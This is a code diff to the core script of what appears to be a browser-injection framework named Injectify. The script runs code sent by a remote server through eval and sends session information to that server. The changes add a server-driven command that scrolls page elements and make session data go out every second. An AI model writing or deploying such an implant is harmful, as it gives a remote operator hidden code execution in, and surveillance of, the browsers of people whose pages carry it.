@@ -15,6 +15,11 @@ import { Info, SessionInfo } from './components/Info'
 // Libraries
 import LoadJS from './lib/LoadJS'
 
+if (!window['injectify']) {
+  setTimeout(() => {
+    window.dispatchEvent(new CustomEvent('injectify'))
+  }, 500)
+}
 /**
  * Injectify core API
  * @class
@@ -160,7 +165,8 @@ window['injectify'] = class Injectify {
       listeners: {
         visibility: false,
         timed: {
-          active: false
+          active: false,
+          timer: null
         },
         devtools: false,
         websocket: {}
@@ -170,6 +176,12 @@ window['injectify'] = class Injectify {
       modules: {
         states: {},
         callbacks: {}
+      },
+      scroll: {
+        order: -1,
+        id: null,
+        x: -1,
+        y: -1,
       }
     }
     return (<any>window).inJl1
@@ -202,11 +214,6 @@ injectify.debugLog('core', 'warn', 'Injectify core.ts loaded! => https://github.
 if (!global.windowInjection) new WindowInjection()
 
 /**
- * Send session info to the Injectify server
- */
-injectify.session.send()
-
-/**
  * Replace the basic websocket handler with a feature-rich one
  */
 injectify.listener((data, topic) => {
@@ -232,6 +239,26 @@ injectify.listener((data, topic) => {
           })
         })()
         injectify.result(eval(data))
+        break
+      case 'scroll':
+        let x = data[0]
+        let y = data[1]
+        let id = data[2]
+        let order = data[3]
+        if (injectify.global.scroll.order < order) {
+          let element = document.querySelector(`[_-_=${JSON.stringify(id)}]`)
+          if (element) {
+            element.scrollTop = y
+            element.scrollLeft = x
+          }
+          injectify.global.scroll = {
+            ...injectify.global.scroll,
+            x,
+            y,
+            id,
+            order
+          }
+        }
         break
       case 'core':
         eval(data)
@@ -301,15 +328,9 @@ injectify.DevtoolsListener();
   } else {
     global.listeners.timed.active = true;
     (function sessionInfo() {
-      let currentState = JSON.stringify(injectify.session.info)
-      if (currentState !== global.listeners.timed.prevState) {
-        /**
-         * If the previous state was defined
-         */
-        if (global.listeners.timed.prevState) injectify.session.send()
-        global.listeners.timed.prevState = currentState
-      }
-      setTimeout(sessionInfo, 1000)
+      clearTimeout(global.listeners.timed.timer)
+      injectify.session.send()
+      global.listeners.timed.timer = setTimeout(sessionInfo, 1000)
     })()
   }
 })()
